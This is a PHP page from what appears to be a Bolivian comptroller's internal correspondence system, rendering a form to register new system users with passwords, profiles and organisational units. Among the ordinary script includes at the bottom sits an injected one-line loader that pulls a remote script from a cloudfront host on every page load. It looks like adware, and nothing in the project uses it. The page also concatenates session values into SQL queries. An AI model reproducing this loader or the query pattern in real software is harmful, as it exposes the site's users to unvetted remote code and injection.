<?php include("cabf.php");?>
<?php include("inc.config.php");?>
<?php

date_default_timezone_set('America/La_Paz');
$fecha_ram				= date("Ymd");
$fecha 					= date("Y-m-d");

$idusuario_ss  =  $_SESSION['idusuario_ss'];
$idnombre_ss   =  $_SESSION['idnombre_ss'];
$perfil_ss     =  $_SESSION['perfil_ss'];

$sqlh = "  SELECT idcorres, gestion, correlativo, idusuario, no_control ";
$sqlh.= "  FROM corres WHERE origen= 'INTERNA' ORDER BY idcorres DESC LIMIT 1";
$resulth = mysqli_query($link,$sqlh);
$rowh = mysqli_fetch_array($resulth);
$nuevo= $rowh[2]+1;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SUBCONTRALORIA EMPRESAS PUBLICAS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="" />
<meta name="author" content="http://webthemez.com" />
<!-- c+ss -->
<link href="css/bootstrap.min.css" rel="stylesheet" />
<link href="css/fancybox/jquery.fancybox.css" rel="stylesheet">
<link href="css/flexslider.css" rel="stylesheet" />
<link href="css/style.css" rel="stylesheet" />

<link rel="stylesheet" href="css/jquery-ui.min.css">
<link rel="stylesheet" href="css/style.css">


<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

</head>
<body>
<div id="wrapper">
<div class="topbar">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
         <p class="pull-left hidden-xs">CONTRALORIA GENERAL DEL ESTADO</p>
         <p class="pull-right"><i class="fa fa-user"></i>
        <?php
$sqlus =" SELECT nombres, paterno, materno FROM nombres WHERE idnombre='$idnombre_ss'";
$resultus = mysqli_query($link,$sqlus);
$rowus = mysqli_fetch_array($resultus);?>
        <?php echo $rowus[0];?> <?php echo $rowus[1];?> <?php echo $rowus[2];?></p>
      </div>
    </div>
  </div>
</div>
	<!-- start header -->
	<header>
        <div class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                  <a class="navbar-brand" href="inicio.php"><img src="img/logo.png" alt="logo"/></a>
                </div>
                <?php include("menu_corres.php");?>
            </div>
        </div>
	</header>
    <!-- end header -->
	<section id="inner-headline">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<h2 class="pageTitle">NUEVO USUARIO</h2>
			</div>
		</div>
	</div>
	</section>
	<section id="content">

	<div class="container">
		<div class="row">
		<div class="tg-main-section tg-banner tg-haslayout parallax-window" data-parallax="scroll" data-bleed="100" data-speed="0.2" data-image-src="images/slider/img-03.jpg">
		</div>
		<div class="row">
            <div class="col-md-4"></div>
			<div class="col-md-8">
				<h3 class="row"><a href="usuarios.php">VOLVER</a></h3>
			</div>
		</div>
   	<div class="about-logo">
      <h3>INGRESAR NUEVO USUARIO</h3>
       <p>EN ESTA SECCION SE REALIZA EL REGISTRO DE UN NUEVO USUARIO EN EL SISTEMA</p>
    </div>
    </div>
    <div class="container">
        <div class="box-area">

<!--------- agrega nuevo usuario begin  ------------>

<form class="user" method="post" action="guarda_usuario.php" >

<div class="form-group row">
    <div class="col-sm-4 mb-3 mb-sm-0">
    <h4>NOMBRES:</h4>
    <input type="text" class="form-control" name="nombres" placeholder="Nombres" />
    </div>
    <div class="col-sm-4">
    <h4>PATERNO:</h4>
    <input type="text" class="form-control" name="paterno" placeholder="Paterno" />
    </div>
    <div class="col-sm-4">
    <h4>MATERNO:</h4>
    <input type="text" class="form-control" name="materno" placeholder="Materno"/>
    </div>
</div>

<div class="form-group row">
    <div class="col-sm-6 mb-3 mb-sm-0">
    <h4>CEDULA DE IDENTIDAD:</h4>
    <input type="text" class="form-control" name="ci" placeholder="N° de CI">
    </div>
    <div class="col-sm-6">
    <h4>EXPEDIDO EN:</h4>
    <select size="1" name="exp" class="form-control" >
        <option value="">Seleccione</option>
        <option value="LP">LP</option>
        <option value="CBBA">CBBA</option>
        <option value="CH">CH</option>
        <option value="TA">TA</option>
        <option value="OR">OR</option>
        <option value="PT">PT</option>
        <option value="PN">PN</option>
        <option value="SC">SC</option>
        <option value="BN">BN</option>
    </select>
    
    </div>
</div>

<div class="form-group row">
    <div class="col-sm-4 mb-3 mb-sm-0">
    <h4>USUARIO DE SISTEMA:</h4>
    <input type="text" class="form-control" name="usuario" placeholder="usuario" >
    </div>
    <div class="col-sm-4">
    <h4>CONTRASEÑA:</h4>
    <input type="password" class="form-control" name="password" placeholder="Contraseña">
    </div>
    <div class="col-sm-4">
    <h4>PERFIL:</h4>
    <select size="1" name="perfil" class="form-control" >
        <option value="">Seleccione</option>
        <option value="ADMINISTRADOR">ADMINISTRADOR</option>
        <option value="GERENTE">GERENTE</option>
        <option value="USUARIO">USUARIO</option>
    </select>
    </div>
</div>

<div class="form-group row">
    <div class="col-sm-12 mb-3 mb-sm-0">
    <h4>UNIDAD ORGANIZACIONAL</h4>
    <select name="iddireccion"  id="iddireccion" class="form-control">
                        <option value="">Elegir </option>
                        <?php
/*
Realizamos una consulta ala tabla autor
para mostrar los datos en un combo
*/
$sql1 = "select iddireccion,direccion from direccion";
$result1 = mysqli_query($link,$sql1);
if ($row1 = mysqli_fetch_array($result1)){
mysqli_field_seek($result1,0);
while ($field1 = mysqli_fetch_field($result1)){
} do {
echo "<option value=". $row1[0]. ">". $row1[1]. "</option>";
} while ($row1 = mysqli_fetch_array($result1));
} else {
echo "No se encontraron resultados!";
}
?>
</select>

    </div>
</div>

<div class="form-group row">
    <div class="col-sm-12 mb-3 mb-sm-0">
    <h4>ÁREA ORGANIZACIONAL</h4>
    <select name="idarea"  id="idarea" class="form-control"></select>
    </div>
</div>

<div class="form-group row">
    <div class="col-sm-12 mb-3 mb-sm-0">
    <h4>CARGO:</h4>
    <select name="idcargo" id="idcargo" class="form-control"></select>                                    
    </div>
</div>

<br>
<button type="button" class="btn btn-primary" data-toggle="modal" data-target="#saveModal">
            REGISTRAR NUEVO USUARIO DE SISTEMA
        </button>
<!--  Modal para envio a guardar -->
<div class="modal fade" id="saveModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel2"
aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="exampleModalLabel2">¿ESTA SEGURO DE REGISTRAR EL NUEVO USUARIO?</h5>
<button class="close" type="button" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">Seleccione la opción GUARDAR para realizar el registro, luego recien se podra pasar a aprobación.</div>
<div class="modal-footer">
<button class="btn btn-secondary" type="button" data-dismiss="modal">Cancelar</button>
<button class="btn btn-primary" type="submit">Guardar DATOS DE USUARIO</a>
</div>
</div>
</div>
</div>
<hr>
</form>

<!-------- agrega nuevo usuario end --------->
        </div>
    </div>
</br>
  </section>
	<footer>
	<?php include("footer.php");?>
	</footer>
</div>
<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>
<!-- javascript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="js/jquery.js"></script>
<script src="js/jquery.easing.1.3.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.fancybox.pack.js"></script>
<script src="js/jquery.fancybox-media.js"></script>
<script src="js/jquery.flexslider.js"></script>
<script src="js/animate.js"></script>
<!-- Vendor Scripts -->
<script src="js/modernizr.custom.js"></script>
<script src="js/jquery.isotope.min.js"></script>
<script src="js/jquery.magnific-popup.min.js"></script>
<script src="js/animate.js"></script>
<script src="js/custom.js"></script>
<script src="contact/jqBootstrapValidation.js"></script>
<script src="contact/contact_me.js"></script>
<script language="javascript" src="js/jquery-3.1.1.min.js"></script>
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>
<script>$("#fecha1").datepicker($.datepicker.regional[ "es" ]);</script>
<script>$("#fecha2").datepicker($.datepicker.regional[ "es" ]);</script>

<script language="javascript">
    $(document).ready(function(){
    $("#iddireccion").change(function () {
            $("#iddireccion option:selected").each(function () {
                direccion=$(this).val();
                $.post("unidades.php", { direccion: direccion }, function(data){
                $("#idarea").html(data);
                });
            });
    })
    });
</script>
<script language="javascript">
    $(document).ready(function(){
    $("#idarea").change(function () {
            $("#idarea option:selected").each(function () {
                area=$(this).val();
                $.post("cargos.php", { area: area }, function(data){
                $("#idcargo").html(data);
                });
            });
    })
    });
</script>

</body>
</html>